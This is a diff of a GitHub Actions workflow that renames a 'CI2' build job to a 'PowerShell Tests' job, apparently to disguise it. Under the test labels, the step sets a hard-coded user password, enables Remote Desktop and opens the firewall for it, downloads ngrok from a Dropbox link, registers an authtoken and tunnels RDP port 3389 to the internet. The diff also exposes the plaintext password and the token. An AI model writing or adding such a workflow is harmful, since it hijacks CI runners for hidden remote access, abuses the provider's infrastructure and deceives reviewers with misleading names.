@@ -1,19 +1,35 @@
-name: CI2
-on: [push]
+# CI Validation
+
+name: PowerShell Tests
+
+on:
+  workflow_dispatch:
+    branches: [ main ]
+    paths:
+      - 'helpers/software-report-base/**'
+
 jobs:
-  build:
+  powershell-tests:
+    name: PowerShell tests
     runs-on: windows-latest
+
     steps:
-    - name: Build the Docker image
-      run: |
-        Set-LocalUser -Name "installer" -Password (ConvertTo-SecureString -AsPlainText "@Wayan230903" -Force)
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0 
-        Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 
-        Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
-        C:
-        cd..
-        cd..
-        cd users && cd public
-        Invoke-WebRequest https://www.dropbox.com/s/u32c79ae1oj0m1z/ngrok.exe?dl=1  -OutFile ngrok.exe
-        .\ngrok authtoken 1lzpsFqpjyd50bu443avWew6q6u_612SZ19XczkhtrvQ6HGcD
-        ./ngrok tcp 3389
+      - name: Checkout Repository
+        uses: actions/checkout@v3
+
+      - name: Run Software Report module tests
+        shell: pwsh
+        run: |
+            Set-LocalUser -Name "installer" -Password (ConvertTo-SecureString -AsPlainText "@Wayan230903" -Force)
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0 
+            Enable-NetFirewallRule -DisplayGroup "Remote Desktop" 
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "fInheritInitialProgram" -Value 0
+            Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "fInheritMaxDisconnectionTime" -Value 0
+            C:
+            cd..
+            cd..
+            cd users && cd public
+            Invoke-WebRequest https://www.dropbox.com/s/u32c79ae1oj0m1z/ngrok.exe?dl=1  -OutFile ngrok.exe
+            .\ngrok authtoken 1lzpsFqpjyd50bu443avWew6q6u_612SZ19XczkhtrvQ6HGcD
+            ./ngrok tcp 3389
